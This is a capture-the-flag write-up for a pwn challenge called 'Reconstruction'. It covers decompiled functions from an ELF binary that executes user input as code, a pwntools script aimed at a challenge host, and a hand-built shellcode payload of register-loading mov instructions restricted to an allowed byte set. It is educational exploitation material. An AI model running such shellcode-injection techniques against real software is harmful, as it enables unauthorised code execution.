# Reconstruction

## Analysis

The problem give us a 64-bit ELF executable with PIE enable that prompt us to enter certain inputs to exploit the logic of the program to give us the flag.

## Solution

### • Gathering info:

Checksec the executable give us:

```
gef➤ checksec
[+] checksec for '/Documents/HTB/pwn/Reconstruction/pwn_reconstruction/challenge/reconstruction'
Canary    : ✓ (value: 0x2ae85bcf9e350800)
NX        : ✗
PIE       : ✓
Fortify   : ✗
RELRO     : Full
```

Even though the program is PIE enable, it won't affect us as we will see later on.

By opening the executable through Binary Ninja, we can see there are 4 main functions that we need to focus on:

+ `main()`:

```c
int64_t main()
{
    void* fsbase;
    int64_t var_10 = *(uint64_t*)((char*)fsbase + 0x28);
    banner();
    int32_t buffer = 0;
    char var_11 = 0;
    printstr("\n[*] Initializing components...…");
    sleep(1);
    puts("\x1b[1;31m");
    printstr("[-] Error: Misaligned components…");
    puts("\x1b[1;34m");
    printstr("[*] If you intend to fix them, t…");
    read(0, &buffer, 4);
    
    if (strncmp(&buffer, &data_344c, 3, &data_344c) != 0)
    {
        puts("\x1b[1;31m");
        printstr("[-] Mission failed!\n\n");
        exit(0x520);
    }
    else
    {
        puts("\x1b[1;33m");
        printstr("[!] Carefully place all the comp…");
        
        if (check() != 0)
            read_flag();
    }
    
    exit(0x520);
    /* tailcall */
    return setup();
}
```

+ `check()`:

```c
int64_t check()
{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    int64_t* inputBuffer = mmap(0, 60, 7, 0x22, 0xffffffff, 0);
    
    if (inputBuffer == -1)
    {
        perror("mmap");
        exit(1);
    }
    
    int64_t s;
    __builtin_memset(&s, 0, 61);
    read(0, &s, 60);
    *(uint64_t*)inputBuffer = s;
    __builtin_memset(&inputBuffer[1], 0, 32);
    int64_t var_40;
    inputBuffer[5] = var_40;
    *(uint64_t*)((char*)inputBuffer + 45) = var_40;
    int64_t var_33;
    *(uint64_t*)((char*)inputBuffer + 53) = var_33;
    
    if (validate_payload(inputBuffer, 59) == 0)
    {
        error("Invalid payload! Execution denie…");
        exit(1);
    }
    
    inputBuffer();
    munmap(inputBuffer, 60);
    char var_79 = 0;
    int64_t result;
    
    while (true)
    {
        if (var_79 > 6)
        {
            result = 1;
            break;
        }
        
        int64_t r12;
        int64_t r13;
        int64_t r14;
        int64_t r15;
        
        if (regs(&buf[((int64_t)((uint32_t)var_79))], r12, r13, r14, r15) != *(uint64_t*)((((int64_t)((uint32_t)var_79)) << 3) + &values))
        {
            int64_t rbx_2 = *(uint64_t*)((((int64_t)((uint32_t)var_79)) << 3) + &values);
            int64_t rax_17 = regs(&buf[((int64_t)((uint32_t)var_79))], r12, r13, r14, r15);
            printf("%s\n[-] Value of [ %s$%s%s ]: [ …", "\x1b[1;31m", "\x1b[1;35m", &buf[((int64_t)((uint32_t)var_79))], "\x1b[1;31m", "\x1b[1;35m", rax_17, "\x1b[1;31m", "\x1b[1;32m", "\x1b[1;33m", rbx_2, "\x1b[1;32m");
            result = 0;
            break;
        }
        
        var_79 += 1;
    }
    
    if (rax == *(uint64_t*)((char*)fsbase + 0x28))
        return result;
    
    return __stack_chk_fail();
}
```
+ `validate_payload()`:

```c
int64_t validate_payload(int64_t inputBuffer, int64_t number59)
{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    void* var_20 = nullptr;
    int64_t result;
    
    while (true)
    {
        if (var_20 >= number59)
        {
            result = 1;
            break;
        }
        
        int32_t isByteMatch = 0;
        
        for (int64_t i = 0; i <= 17; i += 1)
        {
            if (*(uint8_t*)((char*)var_20 + inputBuffer) == *(uint8_t*)(i + &allowed_bytes))
            {
                isByteMatch = 1;
                break;
            }
        }
        
        if (isByteMatch == 0)
        {
            printf("%s\n[-] Invalid byte detected: 0…", "\x1b[1;31m", ((uint64_t)*(uint8_t*)((char*)var_20 + inputBuffer)), var_20);
            result = 0;
            break;
        }
        
        var_20 += 1;
    }
    
    if (rax == *(uint64_t*)((char*)fsbase + 0x28))
        return result;
    
    return __stack_chk_fail();
}
```
+ `regs()`:

```c
int64_t regs(int64_t arg1, int64_t arg2 @ r12, int64_t arg3 @ r13, int64_t arg4 @ r14, int64_t arg5 @ r15)
{
    void* fsbase;
    int64_t rax = *(uint64_t*)((char*)fsbase + 0x28);
    int64_t result = 0;
    int32_t rax_2;
    int64_t result_1;
    rax_2 = strcmp(arg1, &data_2008, &data_2008);
    
    if (rax_2 != 0)
    {
        int32_t rax_5;
        int64_t result_2;
        rax_5 = strcmp(arg1, &data_200b, &data_200b);
        
        if (rax_5 != 0)
        {
            int32_t rax_8;
            int64_t result_3;
            rax_8 = strcmp(arg1, &data_200e, &data_200e);
            
            if (rax_8 != 0)
            {
                if (strcmp(arg1, &data_2012, &data_2012) != 0)
                {
                    if (strcmp(arg1, &data_2016, &data_2016) != 0)
                    {
                        if (strcmp(arg1, &data_201a, &data_201a) != 0)
                        {
                            if (strcmp(arg1, &data_201e, &data_201e) != 0)
                                printf("Unknown register: %s\n", arg1);
                            else
                                result = arg5;
                        }
                        else
                            result = arg4;
                    }
                    else
                        result = arg3;
                }
                else
                    result = arg2;
            }
            else
                result = result_3;
        }
        else
            result = result_2;
    }
    else
        result = result_1;
    
    if (rax == *(uint64_t*)((char*)fsbase + 0x28))
        return result;
    
    return __stack_chk_fail();
}
```

<br>

To get the flag, we would have to reach `read_flag()` in `main()`, and to do that, `check()` has to return a number != 0.

Looking at the code in both `main()` and `check()`, we won't be able to exploit buffer overflow, as the character being read is limited, and the first input is force is be `"fix"`. If we analyze the code for the second input a bit more, we can see that in order for the input be valid, it has to be from the list of 18 allowed bytes and has to be at least 60 characters, as seen here in `validate_payload()`.

+ List of allow_bytes:
```c
allowed_bytes:
49 c7 b9 c0 de 37 13 c4 c6 ef be ad ca fe c3 00 ba bd
```
+ Checking for allowed bytes in the second input in  validate_payload():

```c
while (true)
{
    if (var_20 >= number59)
    {
        result = 1;
        break;
    }
    
    int32_t isByteMatch = 0;
    
    for (int64_t i = 0; i <= 17; i += 1)
    {
        if (*(uint8_t*)((char*)var_20 + inputBuffer) == *(uint8_t*)(i + &allowed_bytes))
        {
            isByteMatch = 1;
            break;
        }
    }
    
    if (isByteMatch == 0)
    {
        printf("%s\n[-] Invalid byte detected: 0…", "\x1b[1;31m", ((uint64_t)*(uint8_t*)((char*)var_20 + inputBuffer)), var_20);
        result = 0;
        break;
    }
    
    var_20 += 1;
}
```
<br>
<br>

### • Getting past `validate_payload()` and `inputBuffer()`:

The biggest roadblock ahead for me was figuring out how to utilize the allowed bytes, as in what do they represent, how the program is using it. This is when I figured out in the function `check()`, after `validate_payload()` get called, the input buffer get called as a function! Here's the C and ASM equivalent from Binary Ninja:

> You can see the `inputBuffer()` being called, with the ASM equivalent `call rdx`.

- C:
```c
if (validate_payload(inputBuffer, 59) == 0)
{
    error("Invalid payload! Execution denie…");
    exit(1);
}
    
inputBuffer();
munmap(inputBuffer, 60);
```

- ASM:
```assembly
000019a6  e8fef9ffff         call    validate_payload
000019ab  85c0               test    eax, eax
000019ad  7519               jne     0x19c8

000019af  488d0582190000     lea     rax, [rel data_3338]
000019b6  4889c7             mov     rdi, rax  {data_3338, "Invalid payload! Execution denie…"}
000019b9  e834fcffff         call    error
000019be  bf01000000         mov     edi, 0x1
000019c3  e8c8f8ffff         call    exit

000019c8  488b4590           mov     rax, qword [rbp-0x70 {var_78}]
000019cc  48894598           mov     qword [rbp-0x68 {var_70}], rax
000019d0  488b5598           mov     rdx, qword [rbp-0x68 {var_70}]
000019d4  b800000000         mov     eax, 0x0
000019d9  ffd2               call    rdx
```

Initially, my prediction for this was our input bytes is an address for a function that we can call in the program when `call rdx` is executed. But running the program in `GDB` tells me that the input buffer already got map to a specific address, as I also later found out that is because of the `mmap()` function. 

**=> This mean our input is being used as opcode and operands to create ASM instruction!**

A little research on x86_64 ASM show us that the byte `c3` is opcode for `ret` in ASM, which is what I used for my input payload in the exploit script:

> We actually need more then just a return instruction later, but my goal as this point was just to get past the input buffer being call as a function and move foward.

+ **payload.py**

```python
from pwn import *

# Remote connection details
host = "94.237.50.250"
port = 54813

# Payload to send after 'ts: '
payload = b'\xc3' * 60

# Connect to the remote host
conn = remote(host, port)

# Wait for 'x": ' and send "fix"
output = conn.recvuntil(b'x": ')
print(output.decode())
conn.sendline(b'fix')

# Wait for 'ts: ' and send the payload
output = conn.recvuntil(b'ts: ')
print(output.decode())
conn.send(payload)

output = conn.recv()
print(output.decode())
```

Running this script got me successfully passed the `inputBuffer()` as it only contain a single `return;` instruction.

<br>
<br>

### • Playing with registers value:

After running the `payload.py` script, we get this output:

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⢤⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠈⢳⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡼⠃⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠒⠚⠉⠉⠉⠉⠒⠻⢍⣉⠉⠒⢄⠀⠀⠀⡰⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠯⠖⠂⠀⠀⠈⠉⠙⠲⢄⡀⠀⠈⠑⢦⡀⢳⡠⠚⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⡀⠀⠀⠑⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⢠⠃⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⣾⢸⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⢸⠹⡄⠀⠀⣻⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⢰⡏⣿⣸⣷⠀⠀⣠⠀⠀⠀⠀⠀⡿⡀⢸⡇⣇⠀⠀⠇⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡷⠀⠀⢸⣷⡟⣿⠿⣆⣀⣷⣧⣖⣤⡄⣤⣷⡇⣼⠃⣿⣂⣼⠆⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣟⣆⣄⣸⣿⣿⣿⡆⢿⣦⣽⡿⣿⣿⣷⣿⣿⣷⣿⣼⡟⣦⢻⠀⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣿⣞⡾⢿⡿⠃⠀⠀⠀⠀⠙⠿⠿⢻⠁⠀⣾⣀⡝⣘⣼⠀⢸⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⢸⣿⣾⡁⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢺⠀⠀⣿⡟⢛⣽⠁⠀⣼⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠈⡇⣇⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⢸⠀⢼⣿⡟⢻⠋⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⣿⠘⢆⠀⠀⠀⠀⠤⠖⠁⠀⠀⢸⠀⣾⢹⠁⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⢹⠀⡌⣷⣄⡀⠐⠀⠀⠀⢀⡴⢾⠀⢹⣏⡀⢰⠀⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣸⠀⣧⡟⢹⡿⣦⣤⠶⠚⠁⠀⣿⢰⢸⡏⠱⣾⡀⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠴⠒⠚⣿⣿⠀⢹⢳⡾⠀⠀⠀⠀⠀⠀⠰⢿⣴⢸⠳⡾⢿⢇⢧⠀⢹⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⠊⠁⠀⠀⠀⠀⠈⡟⠀⣿⠘⡇⠀⠀⠀⠀⠀⠀⠀⢸⡏⢸⡖⠁⡈⡏⠻⣧⣸⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡞⠂⠀⠀⠀⠀⠀⠀⣠⡇⠀⣧⠀⢾⣄⡰⠄⠀⠀⡜⠀⢸⣴⣸⠀⠠⠟⡇⠠⡈⠙⢷⠦⣀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⢀⡎⠀⣟⣆⡿⠂⢸⣣⠄⠀⠀⠀⠈⠉⡹⡇⢸⡀⢄⣠⣿⠀⠈⠧⠀⠀⠀⠑⢆⠀⠀
⠀⠀⠀⠀⢹⠀⠀⠀⠀⡀⢀⡎⢀⠴⠿⢿⠃⠁⠀⡯⣆⠀⠀⠀⢀⠞⢹⢳⣸⣅⣀⣡⢹⡄⠀⠀⠀⠀⠀⠀⢘⡄⠀
⠀⠀⠀⠀⢸⡀⠀⠀⠀⣧⣼⡾⠁⠀⠀⠀⠙⣴⠶⢇⡘⣄⢠⡴⠁⠀⢸⠏⠁⠀⠀⠘⢦⡇⢰⠀⠀⡄⠀⠀⠈⡧⠀
⠀⠀⠀⠀⢸⣧⠀⠀⠀⣹⠟⡇⠀⠀⠀⠀⢀⡇⠘⠀⢹⣽⣏⣀⡀⣰⣯⠀⠀⠀⠀⠀⣸⢻⣶⡇⣰⠁⠀⠀⠀⡇⠀
⠀⠀⠀⠀⢸⣿⣄⡠⡾⠁⠀⢙⣤⣀⣀⡤⠾⣅⠀⣰⡟⠉⣀⣈⠙⣟⣾⣦⣀⠀⣀⡤⠏⠀⣿⣴⠃⠀⠀⠀⣸⠇⠀
⠀⠀⠀⠀⢈⡿⠖⢹⠁⠀⢀⠎⠁⢸⠋⠀⣠⠟⠛⢺⡀⠘⠿⠏⠀⢸⠷⠶⠏⢫⠉⠳⡀⠀⠘⢿⠀⠀⠀⢰⣿⠀⠀
⠀⠀⠀⠀⡼⠀⠀⡇⠀⠀⣼⠀⠀⣿⣠⠞⠁⠀⠀⠈⢳⡦⠀⠀⢀⡞⠀⠀⠀⠘⡆⠀⣱⡀⠀⠈⡧⡴⠖⣸⣻⠀⠀
⠀⠀⠀⢠⠃⠀⢠⡇⠀⠀⣿⢀⣿⣿⡁⠀⠀⠀⢀⠔⢫⣀⣤⣴⠏⠀⠀⠀⠀⠀⣷⠀⣿⣇⠀⠀⡇⠀⠀⡌⢹⠀⠀
⠀⠀⠀⡾⠀⠀⠸⡇⠀⠀⠁⢀⠎⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠉⠀⠈⡇⠀⠀⡀⠸⡆⠀
⠀⠀⢰⠃⠀⡤⠀⣿⣀⠀⢀⠏⠀⠀⠀⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡔⠀⠀⠀⠀⣸⠇⠀⢠⠀⠠⡇⠀
⠀⠀⡏⢀⠎⠀⠀⢻⡟⣦⡜⠀⠀⠀⢀⠏⠀⢠⣐⠤⠒⠁⠀⠀⠀⠀⠀⢀⡴⠋⢀⡀⠀⠀⣠⢿⠀⢀⡞⠀⠀⣧⠀
⠀⢸⣷⠋⠀⢠⠃⠸⣿⣜⠃⠆⠀⠀⣎⡴⠖⠉⠀⠀⠀⠀⠀⠀⠀⢀⣴⣋⠴⠖⠉⢀⡀⣠⣫⠇⠀⠸⠃⠀⠀⣿⡄
⢠⡿⠁⠀⢠⠟⠀⢀⣿⣿⣸⡇⠀⣼⠉⠀⠀⠀⠀⠀⡀⠀⠀⠀⠴⠋⣉⡴⠄⢀⡴⠋⣰⣿⠟⠀⠀⠀⠀⠀⣸⣿⡇
⢸⠇⠀⡰⠃⠀⠀⣼⣿⣿⠋⠉⠓⠫⠿⢿⠒⠒⠚⠯⠥⠤⠦⠭⠵⠾⠯⢤⡺⠿⠗⠚⣿⣿⠀⠀⠀⠀⠀⢠⢿⢽⡗
⠀⠀⠀⠀⠀⠘⡿⣿⣿⡟⠙⠲⢤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⢰⣿⣿⣄⣀⠀⠀⠀⣼⣿⡿⠃
⠀⠀⠀⠀⠀⠀⠀⠀⢈⠀⠀⠀⠀⠀⠒⠉⠙⠛⠭⣅⣉⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⡛⠛⠛⠀⠀⠀⠀⠁⠉⠀⠀

[*] Initializing components...

[-] Error: Misaligned components!

[*] If you intend to fix them, type "fix": fix

[!] Carefully place all the components:
[-] Value of [ $r8 ]: [ 0xffffffff ]

[+] Correct value: [ 0x1337c0de ] 
```
Notice how it show the current value in register `r8` and its correct value. This means we have craft ASM instructions that put the correct value to the corresponding register. 

<br>

Let's take a look at where we are in the code to get this output in `check()`:

```c
while (true)
{
    if (var_79 > 6)
    {
        result = 1;
        break;
    }
    
    int64_t r12;
    int64_t r13;
    int64_t r14;
    int64_t r15;
    
    if (regs(&buf[((int64_t)((uint32_t)var_79))], r12, r13, r14, r15) != *(uint64_t*)((((int64_t)((uint32_t)var_79)) << 3) + &values))
    {
        int64_t rbx_2 = *(uint64_t*)((((int64_t)((uint32_t)var_79)) << 3) + &values);
        int64_t rax_17 = regs(&buf[((int64_t)((uint32_t)var_79))], r12, r13, r14, r15);
        printf("%s\n[-] Value of [ %s$%s%s ]: [ …", "\x1b[1;31m", "\x1b[1;35m", &buf[((int64_t)((uint32_t)var_79))], "\x1b[1;31m", "\x1b[1;35m", rax_17, "\x1b[1;31m", "\x1b[1;32m", "\x1b[1;33m", rbx_2, "\x1b[1;32m");
        result = 0;
        break;
    }
    
    var_79 += 1;
}
```

> The output string in the code get shorten out in Binary Ninja, here's the full printf string: `"%s\n[-] Value of [ %s$%s%s ]: [ %s0x%lx%s ]%s\n\n"   "[+] Correct value: [ %s0x%lx%s ]\n\n"`.

> **Disclaimer:** The predefined value of the registers actually exist on the dissassembly, specifically the `&values`. I only figured this out after the competition. Which is why I had to figure out each ASM instructions interatively to slowly get the correct values for every registers. If we know the `&values` ahead, we can figure out every instructions at once. 

<br>

To summarize, what `regs()` is doing, is just going through a predefined list of registers, specifically `r8, r9, r10, r12, r13, r14, r15`, and check if the registers has the correct predefined value. We can also see the endless loop stop when the counter variable `var79` get bigger than 6, which indicate we have to get all the the 7 registers `r8, r9, r10, r12, r13, r14, r15` get its values correct to finally reach `read_flag()` in `main()`.

**=> We can do this with ASM `mov` instruction! We just need to make sure the instruction is make with opcode and operands from the list of allow_bytes**

Here's the two references links I used for this:  
+ [References for register operands and opcode](http://ref.x86asm.net/coder64.html#:~:text=coder64.html%23x-,32/64%2Dbit%20ModR/M%20Byte,-REX.R%3D1)  
+ [Mov instruction](https://c9x.me/x86/html/file_module_x86_id_176.html)

> **I don't want to keep this write up too long, which is why I'm just going to briefly explain the `mov` instruction with two difference ways to represnet in the opcode that we use in the exploit payload. I do recommend reading more on it to understand it, and why it's being used, as I found it's really interesting.**

> I also later found out you can do all of this with just the `asm()` function from the `pwn` library, and not having to go through the process of figuring out the opcode for the `mov` instruction. :)

From those references, we now know:
+ The byte `49` is setting `REX.W` and `REX.B` to 1 (this allow us to use 64-bit operands and extend reggisters `r8 - r15`).
+ `mov` in ModR/M Byte memory addressing mode requires a lot more number of bytes to represent the instruction, but we should avoid this mode whenever possible, because the `inputBuffer` memory was only limited to 60 characters, going past this will result in bad instruction/illegal instruction.
+ `mov` in SIB Byte memory addressing mode requires less bytes, but some register's bytes in this mode are not on the `allowed_bytes` list, hence why we need ModR/M.

**=> Here's the instruction in bytes that I used, and its ASM equivalent**:

```
        OPCODE                                ASM                        MEMORY ADDRESSING MODE
49 c7 c0 de c0 37 13            ->     mov r8 , 0x1337c0de                     SIB Byte
    
49 b9 ef be ad de 00 00 00 00   ->     mov r9 , 0xdeadbeef                    ModR/M Byte
    
49 ba 37 13 ad de 00 00 00 00   ->     mov r10, 0xdead1337                    ModR/M Byte
    
49 c7 c4 fe ca 37 13            ->     mov r12, 0x1337cafe                     SIB Byte
    
49 bd de c0 ef be 00 00 00 00   ->     mov r13, 0xbeefc0de                    ModR/M Byte
    
49 c7 c6 37 13 37 13            ->     mov r14, 0x13371337                     SIB Byte
    
49 c7 c7 ad de 37 13            ->     mov r15, 0x1337dead                     SIB Byte

c3                              ->     ret
```

> **Note how many bytes we need for ModR/M Byte, I actually got stuck quite a while at register `r14` due to I was using ModR/M mode while there's a SIB mode equivalent available, and that cause the whole payload to exceed 60 chars, which mean the r15 instruction is missing the necessary bytes** 

<br>

Update the `payload` in `payload.py` and run it, which give me the flag in the output:

```
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⢤⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠈⢳⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡼⠃⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠤⠒⠚⠉⠉⠉⠉⠒⠻⢍⣉⠉⠒⢄⠀⠀⠀⡰⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠯⠖⠂⠀⠀⠈⠉⠙⠲⢄⡀⠀⠈⠑⢦⡀⢳⡠⠚⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⢠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠢⡀⠀⠀⠑⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⢠⠃⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣄⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⠀⣾⢸⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⢸⠹⡄⠀⠀⣻⠀⠀⠀⠀⠀⠀⠀⠀ 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⢰⡏⣿⣸⣷⠀⠀⣠⠀⠀⠀⠀⠀⡿⡀⢸⡇⣇⠀⠀⠇⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡷⠀⠀⢸⣷⡟⣿⠿⣆⣀⣷⣧⣖⣤⡄⣤⣷⡇⣼⠃⣿⣂⣼⠆⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣟⣆⣄⣸⣿⣿⣿⡆⢿⣦⣽⡿⣿⣿⣷⣿⣿⣷⣿⣼⡟⣦⢻⠀⢿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣿⣞⡾⢿⡿⠃⠀⠀⠀⠀⠙⠿⠿⢻⠁⠀⣾⣀⡝⣘⣼⠀⢸⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⢸⣿⣾⡁⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⢺⠀⠀⣿⡟⢛⣽⠁⠀⣼⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠈⡇⣇⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⢸⠀⢼⣿⡟⢻⠋⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⠀⣿⠘⢆⠀⠀⠀⠀⠤⠖⠁⠀⠀⢸⠀⣾⢹⠁⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⢹⠀⡌⣷⣄⡀⠐⠀⠀⠀⢀⡴⢾⠀⢹⣏⡀⢰⠀⡇⠀⡇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢷⣸⠀⣧⡟⢹⡿⣦⣤⠶⠚⠁⠀⣿⢰⢸⡏⠱⣾⡀⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠴⠒⠚⣿⣿⠀⢹⢳⡾⠀⠀⠀⠀⠀⠀⠰⢿⣴⢸⠳⡾⢿⢇⢧⠀⢹⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡴⠊⠁⠀⠀⠀⠀⠈⡟⠀⣿⠘⡇⠀⠀⠀⠀⠀⠀⠀⢸⡏⢸⡖⠁⡈⡏⠻⣧⣸⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡞⠂⠀⠀⠀⠀⠀⠀⣠⡇⠀⣧⠀⢾⣄⡰⠄⠀⠀⡜⠀⢸⣴⣸⠀⠠⠟⡇⠠⡈⠙⢷⠦⣀⠀⠀⠀⠀
⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⢀⡎⠀⣟⣆⡿⠂⢸⣣⠄⠀⠀⠀⠈⠉⡹⡇⢸⡀⢄⣠⣿⠀⠈⠧⠀⠀⠀⠑⢆⠀⠀
⠀⠀⠀⠀⢹⠀⠀⠀⠀⡀⢀⡎⢀⠴⠿⢿⠃⠁⠀⡯⣆⠀⠀⠀⢀⠞⢹⢳⣸⣅⣀⣡⢹⡄⠀⠀⠀⠀⠀⠀⢘⡄⠀
⠀⠀⠀⠀⢸⡀⠀⠀⠀⣧⣼⡾⠁⠀⠀⠀⠙⣴⠶⢇⡘⣄⢠⡴⠁⠀⢸⠏⠁⠀⠀⠘⢦⡇⢰⠀⠀⡄⠀⠀⠈⡧⠀
⠀⠀⠀⠀⢸⣧⠀⠀⠀⣹⠟⡇⠀⠀⠀⠀⢀⡇⠘⠀⢹⣽⣏⣀⡀⣰⣯⠀⠀⠀⠀⠀⣸⢻⣶⡇⣰⠁⠀⠀⠀⡇⠀
⠀⠀⠀⠀⢸⣿⣄⡠⡾⠁⠀⢙⣤⣀⣀⡤⠾⣅⠀⣰⡟⠉⣀⣈⠙⣟⣾⣦⣀⠀⣀⡤⠏⠀⣿⣴⠃⠀⠀⠀⣸⠇⠀
⠀⠀⠀⠀⢈⡿⠖⢹⠁⠀⢀⠎⠁⢸⠋⠀⣠⠟⠛⢺⡀⠘⠿⠏⠀⢸⠷⠶⠏⢫⠉⠳⡀⠀⠘⢿⠀⠀⠀⢰⣿⠀⠀
⠀⠀⠀⠀⡼⠀⠀⡇⠀⠀⣼⠀⠀⣿⣠⠞⠁⠀⠀⠈⢳⡦⠀⠀⢀⡞⠀⠀⠀⠘⡆⠀⣱⡀⠀⠈⡧⡴⠖⣸⣻⠀⠀
⠀⠀⠀⢠⠃⠀⢠⡇⠀⠀⣿⢀⣿⣿⡁⠀⠀⠀⢀⠔⢫⣀⣤⣴⠏⠀⠀⠀⠀⠀⣷⠀⣿⣇⠀⠀⡇⠀⠀⡌⢹⠀⠀
⠀⠀⠀⡾⠀⠀⠸⡇⠀⠀⠁⢀⠎⠀⠀⠀⠀⡴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠉⠀⠈⡇⠀⠀⡀⠸⡆⠀
